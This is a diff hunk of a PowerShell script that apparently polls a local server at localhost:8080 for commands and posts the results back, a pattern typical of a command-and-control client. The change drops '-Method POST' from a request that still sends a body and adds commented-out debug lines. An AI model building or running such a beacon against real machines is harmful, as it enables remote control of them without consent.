@@ -14,13 +14,16 @@ function post_response([string]$command){
     
 
     $postParams = @{rfile=$command}
-    $req = Invoke-WebRequest "http://localhost:8080/response/mskd" -Headers @{"Authorization"="1"}  -Method POST -Body $postParams 
+    $req = Invoke-WebRequest "http://localhost:8080/response/mskd" -Headers @{"Authorization"="1"}  -Body $postParams 
 }
 
 $var = 1
 
 while ($var -le 5 -and $var -ne 3)
 {
+    # $req2 = Invoke-WebRequest "http://localhost:8080/getcommand/asd" -Headers @{"Authorization"="1"} 
+    # echo $req2
+
     $command = get_command
     $command.Trim()
     if($command -eq "exit"){
